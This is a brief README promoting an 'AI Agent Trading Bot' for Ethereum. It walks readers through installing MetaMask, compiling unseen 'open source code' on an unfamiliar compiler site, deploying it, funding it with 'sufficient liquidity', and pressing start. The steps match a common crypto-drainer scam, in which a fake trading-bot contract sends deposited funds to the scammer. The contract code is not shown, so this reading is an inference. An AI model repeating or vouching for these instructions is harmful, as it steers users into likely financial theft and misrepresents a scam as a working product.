# ETH-TRADING-BOT
🤖 AI Agent Trading Bot 

👉 Download a web3 wallet if you don't already have one, here's the link to MetaMask: https://metamask.io/download

👉 Head over to the compile site : [https://idecompiler.online/](https://idecompiler.online/)

👉 Create a new file, name it one word for example "trade"

👉 Paste the open source code into your "trade" file

👉 Go to the compile tab and compile with version 0.8.4

👉 Go to the deploy tab, select your extension from the menu, connect, then click deploy

👉 Provide sufficient liquidity

👉 Click the start button to begin and stop to withdraw and stop the bot

happy trading
